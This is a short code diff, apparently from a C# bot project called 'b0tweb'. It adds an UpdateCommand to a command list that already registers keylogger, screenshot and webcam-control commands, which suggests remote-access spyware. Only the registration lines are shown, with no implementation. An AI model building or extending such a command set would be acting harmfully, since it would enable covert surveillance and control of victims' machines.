@@ -11,6 +11,7 @@ namespace b0tweb.Commands
             new KeyloggerCommand(),
             new ScreenshotCommand(),
             new WebcamControlCommand(),
+            new UpdateCommand()
         };
 
         /// <summary>
